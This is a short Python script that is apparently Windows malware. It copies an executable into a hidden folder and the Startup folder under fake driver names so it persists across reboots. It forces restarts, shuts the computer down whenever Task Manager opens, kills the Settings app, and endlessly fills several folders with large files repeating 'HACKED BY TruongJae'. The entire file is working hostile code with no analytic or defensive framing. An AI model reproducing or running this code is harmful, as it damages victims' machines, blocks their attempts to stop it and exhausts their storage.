import random
import os
import requests
import psutil
import shutil
import string
import getpass as thongtin
nguoidung = thongtin.getuser()
startup = "C:\\Users\\"+nguoidung+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
download = os.path.abspath(os.path.expanduser(os.path.expandvars("ddosweb.exe")))
nhanban = "C:\\Users\\"+nguoidung
MyDrivers = "C:\\Users\\"+nguoidung+"\\MyDrivers"
def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False
def randomstr(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str
def randomstr(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str
def anthan():
	try:
		checkfolder = os.path.isdir(nhanban+"\\MyDrivers")
		#check folder
		if checkfolder == False:
			os.makedirs(nhanban+"\\MyDrivers")
		#check file rename
		check_file_an = os.path.exists(MyDrivers+"\\SystemIntelGraphicsCommandDrivers.exe")
		if check_file_an == False:
			#check file an in folder
			shutil.copy2(download,MyDrivers+"\\SystemIntelGraphicsCommandDrivers.exe")
			#checkfile
			checkfile = os.path.exists(startup+"\\DriverAudioPresentation.exe")
			if checkfile == False:
				shutil.copy2(MyDrivers+"\\SystemIntelGraphicsCommandDrivers.exe",startup+"\\DriverAudioPresentation.exe")
				runnow = startup+"\\DriverAudioPresentation.exe"
				os.system('"'+runnow+'"')
		if checkIfProcessRunning("DriverAudioPresentation.exe") == False:
			runnow = startup+"\\DriverAudioPresentation.exe"
			os.system('"'+runnow+'"')
		if checkIfProcessRunning("SystemIntelGraphicsCommandDrivers.exe") == False:
			runnow = nhanban+"\\MyDrivers\\SystemIntelGraphicsCommandDrivers.exe"
			os.system('"'+runnow+'"')
		check_startup = os.path.exists(startup+"\\AudioPresentation.exe")
		if check_startup == False:
			shutil.copy2(MyDrivers+"\\SystemIntelGraphicsCommandDrivers.exe",startup+"\\DriverAudioPresentation.exe")
			os.system("shutdown -r -t 1")
		if checkIfProcessRunning("Taskmgr.exe"):
			os.system("shutdown -s -t 1")
		if checkIfProcessRunning("SystemSettings.exe"):
			os.system("taskkill /f /im SystemSettings.exe")
	except:
		pass
dubi1 = "C:\\ProgramData"
dubi2 = "C:\\Users\\Public"
dubi3 = "D:\\DataSystem"
dubi4 = "D:\\MyMusics"
checkfolder3 = os.path.isdir(dubi3)
if checkfolder3 == False:
	os.system("mkdir "+dubi3)
checkfolder4 = os.path.isdir(dubi4)
if checkfolder4 == False:
	os.system("mkdir "+dubi4)
alldubi = [dubi1,dubi2,dubi3,dubi4]
word = "HACKED BY TruongJae "
while True:
	anthan()
	try:
		rdfile = random.choice(alldubi)
		f =open(rdfile+"\\"+str(randomstr(7))+".txt","a+")
		for j in range(99999):
			f.write(word)
		f.close()
	except:
		pass